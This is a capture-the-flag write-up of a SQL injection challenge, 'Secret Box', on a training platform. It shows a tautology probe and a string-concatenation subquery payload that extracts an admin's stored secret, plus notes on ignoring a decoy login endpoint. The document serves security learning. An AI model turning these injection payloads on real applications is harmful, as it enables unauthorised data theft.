# Cylab Academy — Secret Box (Web Exploitation)

## Challenge Overview

| Field           | Details                          |
|----------------|----------------------------------|
| **Platform**   | [Cylab Academy](https://learn.cylabacademy.org/library/747?page=2&category=1)                       |
| **Challenge**  | Secret Box                       |
| **Category**   | Web Exploitation                 |
| **Tools Used** | Burp Suite, Source Code Analysis |

---

## Challenge Description

> *"This secret box is designed to conceal your secrets. It's perfectly secure — only you can see what's inside. Or can you? Try uncovering the admin's secret."*

---

## Reconnaissance & Initial Approach

### Step 1 — Register as Admin

The first instinct was to try registering an account with the username `admin`. This was blocked by the application — admin account already exists.

### Step 2 — Intercepting Login with Burp Suite

Intercepted the login request using **Burp Suite** and stripped the password field from the POST request to probe server behavior.

The server responded with an error that **leaked raw SQL structure** in the response body. This immediately looked like a SQL injection entry point.

```
SQL Error: ...WHERE username = 'admin' AND password = ''...
```

🎯 **This was a deliberate misdirection.** The login endpoint was a decoy — engineered to leak SQL structure and waste the attacker's time chasing a dead end. After noting it, I moved on.

> **Key skill:** Recognizing bait. Not every rabbit hole leads somewhere. The real surface attack was elsewhere.

---

## Finding the Real Attack Surface

### Step 3 — Registering as a Normal User

Registered a normal user account and explored the full application as an authenticated user.

The application had a **"Create a New Secret"** feature — a form to store personal secrets tied to the logged-in user's account.

### Step 4 — Testing the Create Secret Endpoint

Tested the `Create a New Secret` form for SQL injection by entering a basic payload:

```
' OR '1'='1
```

The application responded abnormally — **SQL injection confirmed** on the secret creation endpoint, not the login page.

---

## Source Code Analysis

### Step 5 — Extracting the Admin's owner_id

Dug into the provided source code to understand the database schema and find the admin's identifier.

Found the admin's `owner_id` hardcoded in the source:

```
e2a66f7d-2ce6-4861-b4aa-be8e069601cb
```

The `secrets` table schema revealed:

```sql
INSERT INTO users(id, username, password) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');
INSERT INTO secrets(owner_id, content) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'picoCTF{fake_flag}');
);
```

The flag was stored as the admin's secret — retrievable via the `content` column filtered by the admin's `owner_id`.

---

## Crafting the Payload

### Step 6 — String Concatenation Injection

Since the injection point was inside a string value being inserted into the `secrets` table, a **string concatenation injection** was crafted to append the admin's secret to the input.

**Payload:**

```sql
' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '
```

**How it works:**

The application's backend query likely looked something like:

```sql
INSERT INTO secrets (content, owner_id) VALUES ('<user_input>', '<current_user_id>');
```

Or when retrieving:

```sql
SELECT content FROM secrets WHERE content = '<user_input>' AND owner_id = '<current_user_id>';
```

By injecting the payload, the query becomes:

```sql
SELECT content FROM secrets WHERE content = '' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '' AND owner_id = '...';
```

The subquery pulls the admin's secret directly and concatenates it into the result — causing the application to return the admin's secret in the response.

**Result:** ✅ Flag captured.

---

## Attack Flow Summary

```
Register as admin        →  Blocked
        ↓
Intercept login (Burp)   →  SQL structure leaked (DECOY — skip)
        ↓
Register as normal user  →  Access granted
        ↓
Test Create Secret form  →  SQL injection confirmed
        ↓
Analyze source code      →  Admin owner_id found
        ↓
Craft injection payload  →  Admin secret extracted
        ↓
Flag captured ✅
```

---

## Key Takeaways

### Threat Modeling Over Pattern Matching
The most important skill in this challenge was **not** knowing SQL injection syntax — it was knowing which injection point was real. The login endpoint was deliberately designed to look vulnerable. Chasing it would have wasted significant time.

### The Real Surface Was a Create Form
The vulnerable endpoint was a feature that looked completely harmless — a form to create personal notes. Attackers don't always go through the front door. Secondary features, input forms, and background API calls are often left less protected than the main login.

### Source Code is a Goldmine
When source code is provided in a CTF, read it thoroughly before throwing payloads. The admin's `owner_id` was hardcoded — no guessing, no enumeration needed.

### String Concatenation vs. Classic Injection
This wasn't a classic `' OR '1'='1` login bypass. It was a **data extraction injection** using string concatenation — a technique that pulls data from other tables or rows and surfaces it through the application's own output.

---

## What I Learned

- Recognizing deliberate misdirection in CTF challenges and real-world apps
- Difference between login bypass SQLi and data extraction SQLi
- Using Burp Suite to intercept and analyze server responses
- Reading and analyzing provided source code to extract hardcoded values
- Crafting string concatenation payloads for SQLi data extraction
- Identifying non-obvious attack surfaces in web applications (create/update forms vs. login pages)
- Importance of threat modeling — understanding *where* vulnerabilities live, not just *what* they are

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercepting and analyzing HTTP requests/responses |
| SQL Injection (manual) | Exploiting the vulnerable create secret endpoint |
| Source Code Analysis | Extracting hardcoded admin `owner_id` |

---

## References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [Cylab Academy Platform](https://learn.cylabacademy.org/)
